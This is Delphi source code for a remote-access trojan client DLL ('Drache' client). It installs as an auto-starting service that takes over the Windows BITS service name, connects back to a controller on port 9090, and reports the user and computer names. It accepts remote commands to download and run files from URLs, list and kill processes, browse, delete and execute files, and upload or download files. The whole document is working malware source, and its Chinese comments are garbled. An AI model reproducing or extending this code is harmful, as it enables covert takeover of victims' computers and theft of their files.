{
  ��ע����� Client
}
library Clinet001;

uses
  Windows, WinSvc, WinSvcUnit, SocketUnit, VarUnit, FuncUnit, MainUnit, ShellAPI, UrlMon;

const
  MasterMutex = 'Anskya_Drache_Client_001';                   //  ������
  MasterDNSE  = 'Localhost+++++++++++++++++++++++++++++++++'; //  ����DNS
  MasterPort  = 9090;                                         //  ���Ӷ˿�
  MasterServiceName = 'BITS';                                 //  ��������

var
  MasterSocket: TClientSocket;
  dwCurrState : DWORD;
  SvcStatsHandle: SERVICE_STATUS_HANDLE;
  srvStatus: service_status;

//  Client�����߳�
function ClientWork(stSocket: TClientSocket): DWORD;
var
  dwResult, dwSocketCmd: DWORD;
  StrBuffer, StrTemp: String;
  lpBuffer: Pointer;
  MiniBuffer: TMinBufferHeader;
  bIsNotError: Boolean;
begin
  Result := Sock_Error;
  if (Not stSocket.Connected) then Exit;

  while True do
  begin
    MasterSocket.Idle(0);
    dwResult := stSocket.ReceiveLength;
    if dwResult = 0 then
    begin
      dwResult := stSocket.SendBuffer(lpBuffer, 2);
    end;
    if (Not (stSocket.Connected)) then Break;
    if (dwResult < 4) then Continue;
    dwResult := dwResult + 1;

    GetMem(lpBuffer, dwResult);
    ZeroMemory(lpBuffer, dwResult);
    dwResult := stSocket.ReceiveBuffer(lpBuffer^, dwResult);
    //  �ж����ݰ�����
    Case dwResult of
      MIN_BUFFER_SIZE:
      begin
        dwSocketCmd := PMinBufferHeader(lpBuffer)^.dwSocketCmd;
      end;

      MinEx_BUFFER_SIZE:
      begin
        dwSocketCmd := PMinExBufferHeader(lpBuffer)^.dwSocketCmd;
        dwResult := PMinExBufferHeader(lpBuffer)^.dwBufferSize;
      end;
    else
      dwSocketCmd := PMinBufferHeader(lpBuffer)^.dwSocketCmd;
      StrBuffer := String(Pchar(@(Pchar(lpBuffer)[4])));
    end;
    FreeMem(lpBuffer);

    //  ��������ͷ������������ͷ��
    case dwSocketCmd of

      //  Ping����
      Client_Ping:
      begin
        MessageBox(0, Pchar(StrBuffer), 'By Drache', 0);
      end;

      //  Close Client
      Client_Close:
      begin
        Result := Sock_Close;
        Break;
      end;

      //  Remove Client
      Client_Remove:
      begin
        //  ���÷���Ϊֹͣ״̬
        ConfigServiceEx(MasterServiceName, SERVICE_DISABLED);
        Result := Sock_Close;
        ExitProcess(0);
        Break;
      end;

      //  Downloader
      Client_Download:
      begin
        StrTemp := GetSetupPathEx(2) + ExtractURLName(StrBuffer);
        if URLDownloadToFile(nil, Pchar(StrBuffer), Pchar(StrTemp), 0, nil)= S_OK then
        begin
          ShellExecute(0, 'Open', Pchar(StrTemp), nil, nil, SW_SHOW);
        end;
      end;

      //  Get Process List
      Client_GetProcessList:
      begin
        SendData(stSocket, Client_GetProcessList, GetProcessList());
      end;

      //  Kill Process
      Client_KillProcess:
      begin
        KillProcessByPID(dwResult);
      end;

      //-------------------------------------------------------------------------
      //  ��ȡ�����б�
      Get_DiskList:
      begin
        SendData(stSocket, Get_DiskList, GetDriveList());
      end;
      //  ��ȡĿ¼�б�(Ŀ¼����)
      Get_DirList:
      begin
        SendData(stSocket, Get_DirList, ListFiles(0, StrBuffer));
      end;
      //  ��ȡ�ļ��б�(�ļ���+�ļ���С)
      Get_FileList:
      begin
        SendData(stSocket, Get_FileList, ListFiles(1, StrBuffer));
      end;

      //  �ļ�����
      File_Execute:
      begin
        ShellExecute(0, 'Open', Pchar(StrBuffer), nil, nil, SW_SHOW);
      end;

      //  ɾ���ļ�
      File_Delete:
      begin
        DeleteFile(Pchar(StrBuffer));
      end;

      //  �½��ļ���
      Dir_New:
      begin
        CreateDirectory(Pchar(StrBuffer), nil);
      end;

      //  ɾ���ļ���
      Dir_Delete:
      begin
        RemoveDirectory(Pchar(StrBuffer));
      end;

      //  �����ļ�
      File_DownLoadBegin:
      begin
        bIsNotError := DownloadFile(stSocket, Pchar(StrBuffer));
        if bIsNotError then MiniBuffer.dwSocketCmd := File_DownloadEnd
        else MiniBuffer.dwSocketCmd := File_IO_Error;
        stSocket.SendBuffer(MiniBuffer, MIN_BUFFER_SIZE);
      end;
      
      //  �ϴ��ļ�
      File_UploadBegin:
      begin
        UploadFile(stSocket, Pchar(StrBuffer));
      end;

    else

    end;
  end;
end;

//////////////////////////////////////////////////////////////////////////////////////
//  ����ִ�����߳�
procedure WinMain();
var
  dwResult: DWORD;
  StrBuffer: String;
  MinBuffer: TMinBufferHeader;
begin
  MasterSocket := TClientSocket.Create;

  //  ѭ������Server
  while Not (MasterSocket.Connected) do
  begin
    MasterSocket.Connect(MasterDNSE, MasterPort);
    if MasterSocket.Connected then
    begin
      //  �����������ݰ�
      StrBuffer := GetPcUserName(0) + '|' + GetPcUserName(1) + '|';
      if SendData(MasterSocket, Client_Online, StrBuffer) then
      begin
        //  �ж��Ƿ����ӳ�ʱ
        if MasterSocket.Idle(3) <= 0 then
        begin
          MasterSocket.Disconnect;
          Continue;
        end;

        //  �жϽ��ܵ����ݰ��Ƿ񳤶�Ϊ4,�������ݰ��������ʶ�����߳ɹ���ָ��
        dwResult := MasterSocket.ReceiveBuffer(MinBuffer, Sizeof(TMinBufferHeader));
        if (dwResult = 4) and (MinBuffer.dwSocketCmd = Client_Online) then
        begin
          dwResult := ClientWork(MasterSocket);
          if dwResult = Sock_Close then
          begin
            MasterSocket.Disconnect;
            Break;
          end;
        end else
        begin
          MasterSocket.Disconnect;
          Continue;
        end;
      end;
    end;
    MasterSocket.Disconnect;        //  �Ͽ����ӽ�����һ��ѭ��
    Sleep(10000);
  end;
  MasterSocket.Free;
end;

//  �������߳�
procedure ServiceWinMain;
begin
  OutputDebugString('���������ܿ�ʼ!');
  //GetDebugPrivs;
  WinMain();
end;

{ ��SCM������ͨ�� }
function TellSCM(dwState: DWORD; dwExitCode: DWORD; dwProgress: DWORD ): Boolean;
begin
  srvStatus.dwServiceType := SERVICE_WIN32_SHARE_PROCESS;
  dwCurrState := dwState;
  srvStatus.dwCurrentState := dwState;
  srvStatus.dwControlsAccepted := SERVICE_ACCEPT_STOP or SERVICE_ACCEPT_PAUSE_CONTINUE or SERVICE_ACCEPT_SHUTDOWN;
  srvStatus.dwWin32ExitCode := dwExitCode;
  srvStatus.dwServiceSpecificExitCode := 0;
  srvStatus.dwCheckPoint := dwProgress;
  srvStatus.dwWaitHint := 1000;
  Result := SetServiceStatus(SvcStatsHandle, srvStatus );
end;

{ Service ���ƺ��� }
procedure servicehandler(fdwcontrol: integer); stdcall;
begin
  case fdwcontrol of
    SERVICE_CONTROL_STOP:
    begin
      TellSCM(SERVICE_STOP_PENDING, 0, 1);
      Sleep(10);
      TellSCM(SERVICE_STOPPED, 0, 0);
    end;

    SERVICE_CONTROL_PAUSE:
    begin
      TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
      TellSCM(SERVICE_PAUSED, 0, 0);
    end;

    SERVICE_CONTROL_CONTINUE:
    begin
      TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
      TellSCM(SERVICE_RUNNING, 0, 0 );
    end;
    
    SERVICE_CONTROL_INTERROGATE: TellSCM(dwCurrState, 0, 0);
    SERVICE_CONTROL_SHUTDOWN: TellSCM(SERVICE_STOPPED, 0, 0);
  end;
end;

//  service main ��ں���
procedure ServiceMain(argc : Integer; var argv : pchar ); stdcall;
begin
  Sleep(3000);
  if Not CreatedMutexEx(MasterMutex) then ExitProcess(0);
  
  // ע����ƺ���
  SvcStatsHandle := RegisterServiceCtrlHandler(MasterServiceName, @servicehandler);
  if (SvcStatsHandle = 0) then
  begin
    OutputDebugString('Error in RegisterServiceCtrlHandler');
    ExitProcess(0);
  end else
  begin
    //  �ı���������ģʽ
    if ConfigServiceEx(MasterServiceName, SERVICE_AUTO_START) then OutputDebugString('Setting Service AutoRun Done!')
    else OutputDebugString('Setting Service AutoRun Error!');
  end;

  // ��������
  TellSCM(SERVICE_START_PENDING, 0, 1);
  TellSCM(SERVICE_RUNNING, 0, 0);
  OutputDebugString('Service is Running');
  // �������ִ����������Ҫ���Ĵ���
  while ((dwCurrState <> SERVICE_STOP_PENDING) and (dwCurrState <> SERVICE_STOPPED)) do
  begin
    ServiceWinMain;
  end;
  OutputDebugString('Service Exit');
end;

{ dll��ںͳ��ڴ����� }
procedure DLLEntryPoint(dwReason : DWord);
begin
  case dwReason of
    DLL_PROCESS_ATTACH:  ;
    DLL_PROCESS_DETACH:  ;
    DLL_THREAD_ATTACH:   ;
    DLL_THREAD_DETACH:   ;
  end;
end;

// ���������б�
exports
  ServiceMain;

begin
  DllProc := @DLLEntryPoint;
end.
